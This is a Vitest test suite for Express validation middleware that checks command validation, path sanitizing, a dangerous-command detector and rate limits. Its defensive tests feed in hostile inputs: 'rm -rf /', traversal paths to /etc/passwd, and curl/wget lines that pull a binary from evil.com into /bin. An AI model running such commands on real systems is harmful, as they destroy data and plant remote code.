import { describe, it, expect, vi, beforeEach } from 'vitest'
import { Request, Response, NextFunction } from 'express'
import { validateRequest, validateSocketEvent, sanitizers, rateLimit, rateLimits } from '../validation'

// Mock Express request/response
const mockRequest = (body = {}) => ({
  body,
  ip: '127.0.0.1',
} as Request)

const mockResponse = () => {
  const res = {} as Response
  res.status = vi.fn().mockReturnValue(res)
  res.json = vi.fn().mockReturnValue(res)
  return res
}

const mockNext = vi.fn()

describe('Validation Middleware', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('validateRequest', () => {
    describe('execute validation', () => {
      it('should validate valid execution request', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          command: 'npm test',
          timeout: 60000,
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
        expect(res.status).not.toHaveBeenCalled()
      })

      it('should reject request with missing required fields', async () => {
        const req = mockRequest({
          command: 'npm test',
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
        expect(res.json).toHaveBeenCalledWith({
          error: 'Validation failed',
          code: 'VALIDATION_ERROR',
          details: expect.arrayContaining([
            expect.objectContaining({
              field: 'projectId',
              message: expect.any(String),
            }),
          ]),
        })
      })

      it('should reject dangerous commands', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          command: 'sudo rm -rf /',
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
        expect(res.json).toHaveBeenCalledWith({
          error: 'Command contains potentially dangerous patterns',
          code: 'DANGEROUS_COMMAND',
        })
      })

      it('should sanitize file paths', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          command: 'python script.py',
          targetFiles: ['../../../etc/passwd', '//double//slash//file.js'],
          workingDirectory: '/../../sensitive/',
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
        expect(req.body.targetFiles).toEqual(['etc/passwd', 'double/slash/file.js'])
        expect(req.body.workingDirectory).toBe('sensitive')
      })

      it('should enforce timeout limits', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          command: 'npm test',
          timeout: 400000, // Over 5 minutes
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
      })

      it('should truncate long commands', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          command: 'a'.repeat(6000),
        })
        const res = mockResponse()
        const middleware = validateRequest('execute')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
        expect(req.body.command.length).toBe(5000)
      })
    })

    describe('fileSync validation', () => {
      it('should validate valid file sync request', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          files: [
            {
              path: 'src/index.js',
              content: 'console.log("hello");',
              action: 'create',
            },
          ],
        })
        const res = mockResponse()
        const middleware = validateRequest('fileSync')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
        expect(res.status).not.toHaveBeenCalled()
      })

      it('should reject files exceeding size limit', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          files: [
            {
              path: 'large.txt',
              content: 'x'.repeat(11 * 1024 * 1024), // 11MB
              action: 'create',
            },
          ],
        })
        const res = mockResponse()
        const middleware = validateRequest('fileSync')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
      })

      it('should sanitize file paths in fileSync', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          files: [
            {
              path: '../../../etc/passwd',
              content: 'malicious',
              action: 'create',
            },
            {
              path: 'src/../../../sensitive.txt',
              content: 'data',
              action: 'update',
            },
          ],
        })
        const res = mockResponse()
        const middleware = validateRequest('fileSync')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
        expect(req.body.files[0].path).toBe('etc/passwd')
        expect(req.body.files[1].path).toBe('src/sensitive.txt')
      })

      it('should validate action enum', async () => {
        const req = mockRequest({
          projectId: 'test-project',
          files: [
            {
              path: 'file.js',
              content: 'content',
              action: 'invalid-action',
            },
          ],
        })
        const res = mockResponse()
        const middleware = validateRequest('fileSync')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
      })
    })

    describe('auth validation', () => {
      it('should validate auth request with token', async () => {
        const req = mockRequest({
          token: 'valid-jwt-token',
        })
        const res = mockResponse()
        const middleware = validateRequest('auth')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
      })

      it('should reject auth request without token', async () => {
        const req = mockRequest({})
        const res = mockResponse()
        const middleware = validateRequest('auth')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
      })
    })

    describe('project validation', () => {
      it('should validate project data', async () => {
        const req = mockRequest({
          id: 'project-123',
          name: 'My Project',
          path: '/home/user/projects/my-project',
        })
        const res = mockResponse()
        const middleware = validateRequest('project')

        await middleware(req, res, mockNext)

        expect(mockNext).toHaveBeenCalled()
      })

      it('should enforce name length limits', async () => {
        const req = mockRequest({
          id: 'project-123',
          name: 'a'.repeat(101),
        })
        const res = mockResponse()
        const middleware = validateRequest('project')

        await middleware(req, res, mockNext)

        expect(mockNext).not.toHaveBeenCalled()
        expect(res.status).toHaveBeenCalledWith(400)
      })
    })

    it('should handle non-validation errors', async () => {
      const req = mockRequest({})
      const res = mockResponse()
      const middleware = validateRequest('execute')
      
      // Mock schema to throw non-Zod error
      const originalParse = Object.getOwnPropertyDescriptor(
        Object.getPrototypeOf(req.body),
        'constructor'
      )
      Object.defineProperty(req.body, 'projectId', {
        get() {
          throw new Error('Unexpected error')
        },
      })

      await middleware(req, res, mockNext)

      expect(mockNext).toHaveBeenCalledWith(expect.any(Error))
    })
  })

  describe('validateSocketEvent', () => {
    it('should validate valid socket event data', async () => {
      const data = {
        projectId: 'test-project',
        command: 'npm test',
      }
      const callback = vi.fn()
      const validator = validateSocketEvent('execute')

      await validator(data, callback)

      expect(callback).toHaveBeenCalledWith()
      expect(data.command).toBe('npm test')
    })

    it('should reject dangerous commands in socket events', async () => {
      const data = {
        projectId: 'test-project',
        command: 'rm -rf /',
      }
      const callback = vi.fn()
      const validator = validateSocketEvent('execute')

      await validator(data, callback)

      expect(callback).toHaveBeenCalledWith(
        expect.objectContaining({
          message: expect.stringContaining('dangerous patterns'),
        })
      )
    })

    it('should sanitize paths in socket events', async () => {
      const data = {
        projectId: 'test-project',
        command: 'python script.py',
        targetFiles: ['../../etc/passwd'],
      }
      const callback = vi.fn()
      const validator = validateSocketEvent('execute')

      await validator(data, callback)

      expect(callback).toHaveBeenCalledWith()
      expect(data.targetFiles).toEqual(['etc/passwd'])
    })

    it('should handle validation errors in socket events', async () => {
      const data = {
        command: 'npm test',
        // Missing projectId
      }
      const callback = vi.fn()
      const validator = validateSocketEvent('execute')

      await validator(data, callback)

      expect(callback).toHaveBeenCalledWith(
        expect.objectContaining({
          message: expect.stringContaining('Validation failed'),
        })
      )
    })
  })

  describe('sanitizers', () => {
    describe('sanitizePath', () => {
      it('should remove directory traversal attempts', () => {
        expect(sanitizers.sanitizePath('../../../etc/passwd')).toBe('etc/passwd')
        expect(sanitizers.sanitizePath('src/../../../file.txt')).toBe('src/file.txt')
        expect(sanitizers.sanitizePath('..\\..\\windows\\system32')).toBe('windows/system32')
      })

      it('should remove leading slashes', () => {
        expect(sanitizers.sanitizePath('/etc/passwd')).toBe('etc/passwd')
        expect(sanitizers.sanitizePath('///multiple///slashes')).toBe('multiple/slashes')
      })

      it('should remove dangerous characters', () => {
        expect(sanitizers.sanitizePath('file<script>.js')).toBe('filescript.js')
        expect(sanitizers.sanitizePath('file:name.txt')).toBe('filename.txt')
        expect(sanitizers.sanitizePath('file|pipe.txt')).toBe('filepipe.txt')
        expect(sanitizers.sanitizePath('file\0null.txt')).toBe('filenull.txt')
      })

      it('should normalize path separators', () => {
        expect(sanitizers.sanitizePath('src\\components\\file.js')).toBe('src/components/file.js')
        expect(sanitizers.sanitizePath('mixed\\path/separators')).toBe('mixed/path/separators')
      })

      it('should handle empty and whitespace paths', () => {
        expect(sanitizers.sanitizePath('')).toBe('')
        expect(sanitizers.sanitizePath('   ')).toBe('')
        expect(sanitizers.sanitizePath(' file.txt ')).toBe('file.txt')
      })
    })

    describe('sanitizeCommand', () => {
      it('should remove null bytes', () => {
        expect(sanitizers.sanitizeCommand('echo\0hidden')).toBe('echohidden')
        expect(sanitizers.sanitizeCommand('cmd\x00\x00')).toBe('cmd')
      })

      it('should trim whitespace', () => {
        expect(sanitizers.sanitizeCommand('  npm test  ')).toBe('npm test')
        expect(sanitizers.sanitizeCommand('\n\tnpm test\n\t')).toBe('npm test')
      })

      it('should truncate long commands', () => {
        const longCommand = 'echo ' + 'a'.repeat(6000)
        const sanitized = sanitizers.sanitizeCommand(longCommand)
        expect(sanitized.length).toBe(5000)
        expect(sanitized.startsWith('echo ')).toBe(true)
      })
    })

    describe('containsDangerousPatterns', () => {
      it('should detect system modification commands', () => {
        expect(sanitizers.containsDangerousPatterns('rm -rf /')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('sudo apt-get install')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('chmod 777 /etc/passwd')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('chown root:root file')).toBe(true)
      })

      it('should detect code execution patterns', () => {
        expect(sanitizers.containsDangerousPatterns('eval("malicious")')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('exec("command")')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('system("ls")')).toBe(true)
      })

      it('should detect dangerous network operations', () => {
        expect(sanitizers.containsDangerousPatterns('curl http://evil.com --output /bin/evil')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('wget http://evil.com -O /bin/evil')).toBe(true)
      })

      it('should detect environment manipulation', () => {
        expect(sanitizers.containsDangerousPatterns('export PATH=/evil/path:$PATH')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('unset IMPORTANT_VAR')).toBe(true)
      })

      it('should allow safe commands', () => {
        expect(sanitizers.containsDangerousPatterns('npm test')).toBe(false)
        expect(sanitizers.containsDangerousPatterns('git status')).toBe(false)
        expect(sanitizers.containsDangerousPatterns('python script.py')).toBe(false)
        expect(sanitizers.containsDangerousPatterns('ls -la')).toBe(false)
        expect(sanitizers.containsDangerousPatterns('echo "Hello World"')).toBe(false)
      })

      it('should be case insensitive', () => {
        expect(sanitizers.containsDangerousPatterns('SUDO rm -rf /')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('Eval("code")')).toBe(true)
        expect(sanitizers.containsDangerousPatterns('EXPORT PATH=evil')).toBe(true)
      })
    })
  })

  describe('rateLimit', () => {
    it('should allow requests within limit', async () => {
      const req = mockRequest()
      const res = mockResponse()
      const middleware = rateLimit({ windowMs: 60000, max: 5 })

      // Make 5 requests (at the limit)
      for (let i = 0; i < 5; i++) {
        await middleware(req, res, mockNext)
        expect(mockNext).toHaveBeenCalled()
        mockNext.mockClear()
      }
    })

    it('should block requests exceeding limit', async () => {
      const req = mockRequest()
      const res = mockResponse()
      const middleware = rateLimit({ windowMs: 60000, max: 2 })

      // Make 2 requests (at the limit)
      await middleware(req, res, mockNext)
      await middleware(req, res, mockNext)
      
      // 3rd request should be blocked
      mockNext.mockClear()
      await middleware(req, res, mockNext)
      
      expect(mockNext).not.toHaveBeenCalled()
      expect(res.status).toHaveBeenCalledWith(429)
      expect(res.json).toHaveBeenCalledWith({
        error: 'Too many requests',
        code: 'RATE_LIMIT_EXCEEDED',
      })
    })

    it('should use custom error message', async () => {
      const req = mockRequest()
      const res = mockResponse()
      const middleware = rateLimit({ 
        windowMs: 60000, 
        max: 1,
        message: 'Custom rate limit message'
      })

      // Make 2 requests
      await middleware(req, res, mockNext)
      mockNext.mockClear()
      await middleware(req, res, mockNext)
      
      expect(res.json).toHaveBeenCalledWith({
        error: 'Custom rate limit message',
        code: 'RATE_LIMIT_EXCEEDED',
      })
    })

    it('should track requests by IP', async () => {
      const req1 = mockRequest()
      req1.ip = '192.168.1.1'
      const req2 = mockRequest()
      req2.ip = '192.168.1.2'
      const res = mockResponse()
      const middleware = rateLimit({ windowMs: 60000, max: 1 })

      // First IP can make 1 request
      await middleware(req1, res, mockNext)
      expect(mockNext).toHaveBeenCalled()
      
      // Second IP can also make 1 request
      mockNext.mockClear()
      await middleware(req2, res, mockNext)
      expect(mockNext).toHaveBeenCalled()
      
      // First IP's second request is blocked
      mockNext.mockClear()
      await middleware(req1, res, mockNext)
      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should handle missing IP gracefully', async () => {
      const req = mockRequest()
      delete req.ip
      const res = mockResponse()
      const middleware = rateLimit({ windowMs: 60000, max: 1 })

      await middleware(req, res, mockNext)
      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('rateLimits configuration', () => {
    it('should have proper general rate limit', () => {
      expect(rateLimits.general).toEqual({
        windowMs: 15 * 60 * 1000,
        max: 100,
        message: 'Too many requests, please try again later',
      })
    })

    it('should have stricter execution rate limit', () => {
      expect(rateLimits.execution).toEqual({
        windowMs: 60 * 1000,
        max: 5,
        message: 'Too many execution requests, please wait before trying again',
      })
    })

    it('should have appropriate file operations rate limit', () => {
      expect(rateLimits.fileOps).toEqual({
        windowMs: 60 * 1000,
        max: 30,
        message: 'Too many file operations, please slow down',
      })
    })
  })
})